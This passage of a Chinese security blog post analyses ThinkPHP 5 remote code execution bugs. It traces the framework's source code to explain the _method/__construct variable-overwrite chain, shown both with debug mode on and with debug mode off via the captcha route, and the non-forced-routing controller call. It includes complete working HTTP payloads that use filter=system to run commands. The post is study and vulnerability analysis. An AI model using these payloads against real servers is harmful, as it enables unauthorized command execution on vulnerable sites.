class="variable">$dispatch</span>)) &#123;</span><br><span class="line">        <span class="comment">// 进行URL路由检测</span></span><br><span class="line">        <span class="variable">$dispatch</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">routeCheck</span>(<span class="variable">$request</span>, <span class="variable">$config</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记录当前调度信息</span></span><br><span class="line">    <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$dispatch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录路由和请求信息</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$debug</span>) &#123;</span><br><span class="line">        <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . <span class="title function_ invoke__">var_export</span>(<span class="variable">$dispatch</span>, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ HEADER ] &#x27;</span> . <span class="title function_ invoke__">var_export</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ PARAM ] &#x27;</span> . <span class="title function_ invoke__">var_export</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">param</span>(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*...省略部分...*/</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;redirect&#x27;</span>:</span><br><span class="line">                <span class="comment">// 执行重定向跳转</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="title class_">Response</span>::<span class="title function_ invoke__">create</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;redirect&#x27;</span>)-&gt;<span class="title function_ invoke__">code</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;status&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;module&#x27;</span>:</span><br><span class="line">                <span class="comment">// 模块/控制器/操作</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">module</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;module&#x27;</span>], <span class="variable">$config</span>, <span class="keyword">isset</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>]) ? <span class="variable">$dispatch</span>[<span class="string">&#x27;convert&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;controller&#x27;</span>:</span><br><span class="line">                <span class="comment">// 执行控制器操作</span></span><br><span class="line">                <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">                <span class="variable">$data</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">action</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;controller&#x27;</span>], <span class="variable">$vars</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_controller_layer&#x27;</span>], <span class="variable">$config</span>[<span class="string">&#x27;controller_suffix&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;method&#x27;</span>:</span><br><span class="line">                <span class="comment">// 执行回调方法</span></span><br><span class="line">                <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeMethod</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;method&#x27;</span>], <span class="variable">$vars</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                <span class="comment">// 执行闭包</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeFunction</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;function&#x27;</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;response&#x27;</span>:</span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$dispatch</span>[<span class="string">&#x27;response&#x27;</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="string">&#x27;dispatch type not support&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>首先是经过<code>$dispatch = self::routeCheck($request, $config)</code>检查调用的路由<br>然后会根据debug开关来选择是否执行<code>Request::instance()-&gt;param()</code><br>下面的switch方法是我们未开启debug模式时要利用的方法，这个我们后面细说</p>
+<p>进入routeCheck方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-555b8637ef2b1538f7ead7a35c20ead6_1440w.webp"
+                     
+                ></p>
+<p>直接跳到check，check方法的关键在这里，调用了request变量的method方法，看监视可知<code>$request=think\Request</code>，所以调用的就是request类里面的那个method方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-3539196cc6cf16484d383553de34bc59_1440w.webp"
+                     
+                ></p>
+<p>继续跟进，可以看到，由于我们是无参调用，所以这个method变量的值是false，从而进入到我们的任意request类方法调用环节，<code>_method</code>&#x3D;<br><code>__construct</code>，传入的是construct，跳到construct：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-844912a074ee9d5cc5a8f49302967123_1440w.webp"
+                     
+                ></p>
+<p>进行变量覆盖，结合我们的payload中可知这次覆盖了两个变量，把filter变量覆盖成了system，把server变量覆盖成了<code>REQUEST_METHOD=whoami</code>，变量覆盖完成，只需要调用即可，回到run方法中：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-6ebc9c5d0bd749884de0ac77ef0c5a3b_1440w.webp"
+                     
+                ></p>
+<p>这是第二个关键点，由于我们的debug模式是true，所以进入到if语句，这里关键的地方就是调用了<code>think\Request</code>的<code>param()</code>方法，跟进：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-9832a6b6d843d832569cff71b110a177_1440w.webp"
+                     
+                ></p>
+<p>这里再一次调用了request类的method方法，和上文不同的是传入的参数是true<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-48ae98ca30cccf2b26e2e81c890512b0_1440w.webp"
+                     
+                ></p>
+<p>直接调用server方法，传入的字符串是REQUEST_METHOD，跟进server，可以看到，由于我们先前进行了变量覆盖，这里的server不是空的，就可以绕过这个替换，维持原来的值，看到后面调用了input方法，传入的参数是之前覆盖了的server和REQUEST_METHOD这个字符串<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-ee343dc51cad30f5b09113dbd84f943a_1440w.webp"
+                     
+                ></p>
+<p>第一处关键在这里，这里的意思就是将<code>server[REQUEST_METHOD]</code>也就是whoami传给了data<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-a288cde1e8d9fda8a6ba1843107b9c36_1440w.webp"
+                     
+                ></p>
+<p>第二处关键在这里，filterValue传进去的data就是我们的rce命令，也就是whoami，而filter就是我们之前变量覆盖后的system，最终在filterValue中的call_user_func完成命令执行，这个上文说了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-d8a57edc7ad96123b190a3b874660bb8_1440w.webp"
+                     
+                ></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过控制<code>_method</code>使得调用<code>_construct</code>方法，通过传入<code>filter=system&amp;server[REQUEST_METHOD]=whoami</code>来实现变量覆盖，最后通过debug模式开启，调用<code>param()</code>方法来最终完成RCE</p>
+<h2 id="未开启debug模式"><a href="#未开启debug模式" class="headerlink" title="未开启debug模式"></a>未开启debug模式</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>打开application&#x2F;config.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 其他配置...</span></span><br><span class="line">    <span class="string">&#x27;app_debug&#x27;</span> =&gt; <span class="literal">false</span>, <span class="comment">// 开启调试模式</span></span><br><span class="line">    <span class="string">&#x27;trace&#x27;</span>     =&gt; <span class="literal">false</span>, <span class="comment">// 开启页面Trace</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
+
+<p>cmd：<code>composer require topthink/think-captcha=1.*</code></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>GET:http://localhost:8888/tp/public/?s=captcha</code></p>
+<p><code>POST:_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></p>
+<h3 id="Debug-1"><a href="#Debug-1" class="headerlink" title="Debug"></a>Debug</h3><p>前面的部分和debug模式下大相径庭，我们直接跳到<code>if (self::$debug)</code>后面，继续往下看<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-17ab660b337d156453e1b4bc5dcd11b3_1440w.webp"
+                     
+                ></p>
+<p>跟进exec函数，发现当<code>$dispatch[&#39;type&#39;]</code>是controller或者method的时候，会继续调用param()函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-f7a9b1a4da8eba316fea4e76dd3286fa_1440w.webp"
+                     
+                ></p>
+<p>之后进入param()方法后的流程就和之前一样了，都是通过param进行rce，那我们需要考虑的问题就是怎么让<code>$dispatch[‘type’]=method</code></p>
+<p>在thinkphp5完整版中官网揉进去了一个验证码的路由，可以通过这个路由来使得<code>$dispatch[‘type’] 等于 method</code> ，从而完成rce漏洞。</p>
+<p>具体操作就是直接通过路由访问<code>GET:?s=captcha</code></p>
+<p>之前的那种方法进入<code>method</code>方法后，后面的代码就不用管了，但是这种方法下面的代码仍需要进行，故需要把请求方法设置成get才能访问路由，又因为<code>method()</code>方法的返回值是<code>return $this-&gt;method;</code>，所以<code>__construct()</code>方法里面把<code>$this-&gt;method</code>覆盖成get就可以，也就是说我们post传的参要多一个method&#x3D;get</p>
+<h1 id="未开启强制路由导致RCE"><a href="#未开启强制路由导致RCE" class="headerlink" title="未开启强制路由导致RCE"></a>未开启强制路由导致RCE</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.29 tp51x --prefer-dist</span><br></pre></td></tr></table></figure></div>
+
+<p>composer.json</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.29&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/think-captcha&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.*&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+<p>然后<code>composer update</code></p>
+<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><p><code>?s=index/think\Request/input&amp;filter=system&amp;data=whoami</code></p>
+<h2 id="Debug-2"><a href="#Debug-2" class="headerlink" title="Debug"></a>Debug</h2><p>环境默认采取了兼容模式且强制路由关闭，那么我们可以用兼容模式来调用控制器，当没有对控制器过滤时，我们可以调用任意的方法来执行</p>
+<p>前面说过所有用户参数都会经过 <code>Request</code> 类的 <code>input</code> 方法处理，该方法会调用 <code>filterValue</code> 方法，而 <code>filterValue</code> 方法中使用了 <code>call_user_func</code> ，那么我们就来尝试利用这个方法</p>
+<p>可以看到根本的逻辑就是先get构建app应用，再run，最后send返回结果，rce在run方法中发生，直接跳过get方法进入run方法<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-e218a4e56d7ed8873288c3449e83edd8_1440w.webp"
+                     
+                ></p>
+<p>run方法前面也是一些初始化应用的操作，重点在这里，先通过routeCheck方法再通过init方法获得dispatch变量的值<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-b3e3cd2aaad2cbc42e8694440c5a4fae_1440w.webp"
+                     
+                ></p>
+<p>跟进routeCheck，直接看获取dispatch部分，可以看到这里两个参数，一个是我们输入的s后面的路径，另一个must用来表示未开启强制路由模式：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-8e187ac547b12f1fc32349137512a815_1440w.webp"
+                     
+                ></p>
+<p>跟进check方法，盯住变量检测栏，可以看到这里是把我们的<code>/</code>换成<code>|</code>，url变为了<code>index|think\request|input</code>，后面还有很多处理，但是处理完之后还是不变：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-a1ef6d862e488751569613365304defd_1440w.webp"
+                     
+                ></p>
+<p>最终routeCheck返回的dispatch就是<code>index|think\request|input</code>，接着进行init方法的处理<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-9d6c1044816b58bd38d9326bd468e3a5_1440w.webp"
+                     
+                ></p>
+<p>跟进parseUrl方法，看如何解析我们传入的url，一通跟进<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic2.zhimg.com/80/v2-90b3bae01f822b1b22f6eeedc75d349b_1440w.webp"
+                     
+                ></p>
+<p>一句话解释就是将我们传入的url按照<code>模块/控制器/方法</code>拆成了route数组，然后返回成最终的dispatch，回到run方法中<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picx.zhimg.com/80/v2-cddcbd34235e214dd088a041a56cc1e5_1440w.webp"
+                     
+                ></p>
+<p>来到run方法中的下一个关键点<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-aef35647b27562c1a46aeba598a0d370_1440w.webp"
+                     
+                ></p>
+<p>调用了dispatch的run方法，跟进其中的exec这个危险方法，这个方法的作用就是实例化了控制器<code>think\request</code>，并且通过反射机制获取了url中传入的我们需要调用的方法input，且利用param方法获得请求参数，即<code>filter=system&amp;data=dir</code>，总的来说就是为rce做好了准备<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic3.zhimg.com/80/v2-f51362104e6aa23d77ada4162373988a_1440w.webp"
+                     
+                ></p>
+<p>绑定好参数之后最终调用request.php中的input方法，关键是这里：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pica.zhimg.com/80/v2-648b9fcd572b54c4fc8d1e48610ed1b4_1440w.webp"
+                     
+                ></p>
+<p>跟进filterValue，发现里面直接call_user_func了，func是filter，data是参数，实现rce</p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>整体思路：由于未强制开启路由且是兼容模式，我们传入的参数会被成功解析并调用，相当于按<code>模块/控制器/方法名</code>调用了input，再传入filter作为方法名，data作为参数实现rce</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Thinkphp5 RCE</li>
+        <li><strong>Author:</strong> Saofe1a</li>
+        <li><strong>Created at
+                :</strong> 2024-10-07 21:08:48</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-10-07 21:08:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://saofeia.github.io/2024/10/07/Thinkphp5--RCE/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/10/01/Thinkphp3.2.3%20sql%E6%B3%A8%E5%85%A5/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Thinkphp3.2.3 sql注入</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Thinkphp5 RCE</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE-payload%E6%80%BB%E7%BB%93"><span class="nav-text">RCE payload总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce"><span class="nav-text">method任意调用方法导致rce</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AFdebug%E6%A8%A1%E5%BC%8F"><span class="nav-text">开启debug模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-text">payload:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Debug"><span class="nav-text">Debug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AFdebug%E6%A8%A1%E5%BC%8F"><span class="nav-text">未开启debug模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-1"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Debug-1"><span class="nav-text">Debug</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4RCE"><span class="nav-text">未开启强制路由导致RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-2"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-2"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Debug-2"><span class="nav-text">Debug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-text">总结</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Saofe1a</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        3 posts in total
+                    </span>
+                    
+                        <span>
+                            5.3k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
